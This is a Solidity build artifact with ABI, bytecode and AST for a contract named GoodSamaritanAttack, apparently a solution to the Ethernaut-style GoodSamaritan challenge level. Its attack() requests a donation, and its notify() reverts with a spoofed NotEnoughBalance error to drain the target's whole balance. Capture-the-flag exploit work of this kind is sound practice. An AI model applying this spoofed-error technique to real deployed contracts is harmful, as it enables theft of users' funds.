{"abi":[{"type":"constructor","inputs":[{"name":"goodSamaritan_","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"notify","inputs":[{"name":"amount_","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"pure"},{"type":"error","name":"NotEnoughBalance","inputs":[]}],"bytecode":{"object":"0x60a060405234801561000f575f80fd5b5060405161021638038061021683398101604081905261002e9161003f565b6001600160a01b031660805261006c565b5f6020828403121561004f575f80fd5b81516001600160a01b0381168114610065575f80fd5b9392505050565b6080516101936100835f395f609401526101935ff3fe608060405234801561000f575f80fd5b5060043610610034575f3560e01c806398d078b4146100385780639e5faafc1461004d575b5f80fd5b61004b610046366004610120565b610055565b005b61004b610092565b600a811161008f576040517fad3a8b9e00000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b50565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663251436386040518163ffffffff1660e01b81526004016020604051808303815f875af11580156100fc573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061008f9190610137565b5f60208284031215610130575f80fd5b5035919050565b5f60208284031215610147575f80fd5b81518015158114610156575f80fd5b939250505056fea26469706673582212200cdd5d3801aa9ff6349aeb419cef9e4af1867c3b7cc5bc19ba8ccdc242af58a164736f6c63430008180033","sourceMap":"156:403:48:-:0;;;238:84;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;;;;;284:31:48;;;156:403;;14:290:155;84:6;137:2;125:9;116:7;112:23;108:32;105:52;;;153:1;150;143:12;105:52;179:16;;-1:-1:-1;;;;;224:31:155;;214:42;;204:70;;270:1;267;260:12;204:70;293:5;14:290;-1:-1:-1;;;14:290:155:o;:::-;156:403:48;;;;;;;;;;;;","linkReferences":{}},"deployedBytecode":{"object":"0x608060405234801561000f575f80fd5b5060043610610034575f3560e01c806398d078b4146100385780639e5faafc1461004d575b5f80fd5b61004b610046366004610120565b610055565b005b61004b610092565b600a811161008f576040517fad3a8b9e00000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b50565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663251436386040518163ffffffff1660e01b81526004016020604051808303815f875af11580156100fc573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061008f9190610137565b5f60208284031215610130575f80fd5b5035919050565b5f60208284031215610147575f80fd5b81518015158114610156575f80fd5b939250505056fea26469706673582212200cdd5d3801aa9ff6349aeb419cef9e4af1867c3b7cc5bc19ba8ccdc242af58a164736f6c63430008180033","sourceMap":"156:403:48:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;425:132;;;;;;:::i;:::-;;:::i;:::-;;328:91;;;:::i;425:132::-;497:2;486:7;:13;482:69;;522:18;;;;;;;;;;;;;;482:69;425:132;:::o;328:91::-;379:14;365:45;;;:47;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;14:180:155:-;73:6;126:2;114:9;105:7;101:23;97:32;94:52;;;142:1;139;132:12;94:52;-1:-1:-1;165:23:155;;14:180;-1:-1:-1;14:180:155:o;199:277::-;266:6;319:2;307:9;298:7;294:23;290:32;287:52;;;335:1;332;325:12;287:52;367:9;361:16;420:5;413:13;406:21;399:5;396:32;386:60;;442:1;439;432:12;386:60;465:5;199:277;-1:-1:-1;;;199:277:155:o","linkReferences":{},"immutableReferences":{"49534":[{"start":148,"length":32}]}},"methodIdentifiers":{"attack()":"9e5faafc","notify(uint256)":"98d078b4"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.24+commit.e11b9ed9\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"goodSamaritan_\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"NotEnoughBalance\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount_\",\"type\":\"uint256\"}],\"name\":\"notify\",\"outputs\":[],\"stateMutability\":\"pure\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/attacks/GoodSamaritanAttack.sol\":\"GoodSamaritanAttack\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":1000},\"remappings\":[\":ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/\",\":erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/\",\":forge-std/=lib/forge-std/src/\",\":openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/\",\":openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/\",\":openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/\",\":openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/\",\":openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/\"]},\"sources\":{\"lib/openzeppelin-contracts-08/contracts/utils/Address.sol\":{\"keccak256\":\"0xd6153ce99bcdcce22b124f755e72553295be6abcd63804cfdffceb188b8bef10\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://35c47bece3c03caaa07fab37dd2bb3413bfbca20db7bd9895024390e0a469487\",\"dweb:/ipfs/QmPGWT2x3QHcKxqe6gRmAkdakhbaRgx3DLzcakHz5M4eXG\"]},\"src/attacks/GoodSamaritanAttack.sol\":{\"keccak256\":\"0x110f6720b8848a9d39451ce62f2a7da54ce7adb73b31eb31a6957d2f68424c0c\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://3da301f857f82dbc9f168b78e5246470b520edce9ba415e008c801faf8d26992\",\"dweb:/ipfs/QmQMs65FAPzB88Gnh23ipvy2TChBzpkTRTthxboeBVWLvN\"]},\"src/levels/GoodSamaritan.sol\":{\"keccak256\":\"0xb208a148389591b9b75d6dc1f0edf8d903132168b62239d8b49804f8555f1947\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://3a7b0a11f0319286ed345e53b56ebcb4940b20dff05a1ce94896a4f153dbd615\",\"dweb:/ipfs/QmYkGNmn5PziUnkEy6N9UyLYMRdNf2oo8eV7v1vXGed51M\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.24+commit.e11b9ed9"},"language":"Solidity","output":{"abi":[{"inputs":[{"internalType":"address","name":"goodSamaritan_","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"type":"error","name":"NotEnoughBalance"},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"attack"},{"inputs":[{"internalType":"uint256","name":"amount_","type":"uint256"}],"stateMutability":"pure","type":"function","name":"notify"}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":["ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/","erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/","forge-std/=lib/forge-std/src/","openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/","openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/","openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/","openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/","openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/"],"optimizer":{"enabled":true,"runs":1000},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"src/attacks/GoodSamaritanAttack.sol":"GoodSamaritanAttack"},"evmVersion":"shanghai","libraries":{}},"sources":{"lib/openzeppelin-contracts-08/contracts/utils/Address.sol":{"keccak256":"0xd6153ce99bcdcce22b124f755e72553295be6abcd63804cfdffceb188b8bef10","urls":["bzz-raw://35c47bece3c03caaa07fab37dd2bb3413bfbca20db7bd9895024390e0a469487","dweb:/ipfs/QmPGWT2x3QHcKxqe6gRmAkdakhbaRgx3DLzcakHz5M4eXG"],"license":"MIT"},"src/attacks/GoodSamaritanAttack.sol":{"keccak256":"0x110f6720b8848a9d39451ce62f2a7da54ce7adb73b31eb31a6957d2f68424c0c","urls":["bzz-raw://3da301f857f82dbc9f168b78e5246470b520edce9ba415e008c801faf8d26992","dweb:/ipfs/QmQMs65FAPzB88Gnh23ipvy2TChBzpkTRTthxboeBVWLvN"],"license":"MIT"},"src/levels/GoodSamaritan.sol":{"keccak256":"0xb208a148389591b9b75d6dc1f0edf8d903132168b62239d8b49804f8555f1947","urls":["bzz-raw://3a7b0a11f0319286ed345e53b56ebcb4940b20dff05a1ce94896a4f153dbd615","dweb:/ipfs/QmYkGNmn5PziUnkEy6N9UyLYMRdNf2oo8eV7v1vXGed51M"],"license":"MIT"}},"version":1},"ast":{"absolutePath":"src/attacks/GoodSamaritanAttack.sol","id":49570,"exportedSymbols":{"Address":[48259],"Coin":[53225],"GoodSamaritan":[53146],"GoodSamaritanAttack":[49569],"INotifyable":[53327],"NotEnoughBalance":[49532],"Wallet":[53321]},"nodeType":"SourceUnit","src":"32:528:48","nodes":[{"id":49529,"nodeType":"PragmaDirective","src":"32:23:48","nodes":[],"literals":["solidity","^","0.8",".0"]},{"id":49530,"nodeType":"ImportDirective","src":"57:37:48","nodes":[],"absolutePath":"src/levels/GoodSamaritan.sol","file":"../levels/GoodSamaritan.sol","nameLocation":"-1:-1:-1","scope":49570,"sourceUnit":53328,"symbolAliases":[],"unitAlias":""},{"id":49532,"nodeType":"ErrorDefinition","src":"129:25:48","nodes":[],"errorSelector":"ad3a8b9e","name":"NotEnoughBalance","nameLocation":"135:16:48","parameters":{"id":49531,"nodeType":"ParameterList","parameters":[],"src":"151:2:48"}},{"id":49569,"nodeType":"ContractDefinition","src":"156:403:48","nodes":[{"id":49534,"nodeType":"VariableDeclaration","src":"191:40:48","nodes":[],"constant":false,"mutability":"immutable","name":"_goodSamaritan","nameLocation":"217:14:48","scope":49569,"stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":49533,"name":"address","nodeType":"ElementaryTypeName","src":"191:7:48","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"private"},{"id":49544,"nodeType":"FunctionDefinition","src":"238:84:48","nodes":[],"body":{"id":49543,"nodeType":"Block","src":"274:48:48","nodes":[],"statements":[{"expression":{"id":49541,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":49539,"name":"_goodSamaritan","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":49534,"src":"284:14:48","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":49540,"name":"goodSamaritan_","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":49536,"src":"301:14:48","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"284:31:48","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":49542,"nodeType":"ExpressionStatement","src":"284:31:48"}]},"implemented":true,"kind":"constructor","modifiers":[],"name":"","nameLocation":"-1:-1:-1","parameters":{"id":49537,"nodeType":"ParameterList","parameters":[{"constant":false,"id":49536,"mutability":"mutable","name":"goodSamaritan_","nameLocation":"258:14:48","nodeType":"VariableDeclaration","scope":49544,"src":"250:22:48","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":49535,"name":"address","nodeType":"ElementaryTypeName","src":"250:7:48","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"249:24:48"},"returnParameters":{"id":49538,"nodeType":"ParameterList","parameters":[],"src":"274:0:48"},"scope":49569,"stateMutability":"nonpayable","virtual":false,"visibility":"public"},{"id":49554,"nodeType":"FunctionDefinition","src":"328:91:48","nodes":[],"body":{"id":49553,"nodeType":"Block","src":"355:64:48","nodes":[],"statements":[{"expression":{"arguments":[],"expression":{"argumentTypes":[],"expression":{"arguments":[{"id":49548,"name":"_goodSamaritan","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":49534,"src":"379:14:48","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":49547,"name":"GoodSamaritan","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":53146,"src":"365:13:48","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_GoodSamaritan_$53146_$","typeString":"type(contract GoodSamaritan)"}},"id":49549,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"365:29:48","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_contract$_GoodSamaritan_$53146","typeString":"contract GoodSamaritan"}},"id":49550,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"395:15:48","memberName":"requestDonation","nodeType":"MemberAccess","referencedDeclaration":53145,"src":"365:45:48","typeDescriptions":{"typeIdentifier":"t_function_external_nonpayable$__$returns$_t_bool_$","typeString":"function () external returns (bool)"}},"id":49551,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"365:47:48","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":49552,"nodeType":"ExpressionStatement","src":"365:47:48"}]},"functionSelector":"9e5faafc","implemented":true,"kind":"function","modifiers":[],"name":"attack","nameLocation":"337:6:48","parameters":{"id":49545,"nodeType":"ParameterList","parameters":[],"src":"343:2:48"},"returnParameters":{"id":49546,"nodeType":"ParameterList","parameters":[],"src":"355:0:48"},"scope":49569,"stateMutability":"nonpayable","virtual":false,"visibility":"external"},{"id":49568,"nodeType":"FunctionDefinition","src":"425:132:48","nodes":[],"body":{"id":49567,"nodeType":"Block","src":"472:85:48","nodes":[],"statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":49561,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":49559,"name":"amount_","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":49556,"src":"486:7:48","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<=","rightExpression":{"hexValue":"3130","id":49560,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"497:2:48","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"src":"486:13:48","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":49566,"nodeType":"IfStatement","src":"482:69:48","trueBody":{"id":49565,"nodeType":"Block","src":"501:50:48","statements":[{"errorCall":{"arguments":[],"expression":{"argumentTypes":[],"id":49562,"name":"NotEnoughBalance","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":49532,"src":"522:16:48","typeDescriptions":{"typeIdentifier":"t_function_error_pure$__$returns$__$","typeString":"function () pure"}},"id":49563,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"522:18:48","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":49564,"nodeType":"RevertStatement","src":"515:25:48"}]}}]},"functionSelector":"98d078b4","implemented":true,"kind":"function","modifiers":[],"name":"notify","nameLocation":"434:6:48","parameters":{"id":49557,"nodeType":"ParameterList","parameters":[{"constant":false,"id":49556,"mutability":"mutable","name":"amount_","nameLocation":"449:7:48","nodeType":"VariableDeclaration","scope":49568,"src":"441:15:48","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":49555,"name":"uint256","nodeType":"ElementaryTypeName","src":"441:7:48","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"440:17:48"},"returnParameters":{"id":49558,"nodeType":"ParameterList","parameters":[],"src":"472:0:48"},"scope":49569,"stateMutability":"pure","virtual":false,"visibility":"external"}],"abstract":false,"baseContracts":[],"canonicalName":"GoodSamaritanAttack","contractDependencies":[],"contractKind":"contract","fullyImplemented":true,"linearizedBaseContracts":[49569],"name":"GoodSamaritanAttack","nameLocation":"165:19:48","scope":49570,"usedErrors":[49532],"usedEvents":[]}],"license":"MIT"},"id":48}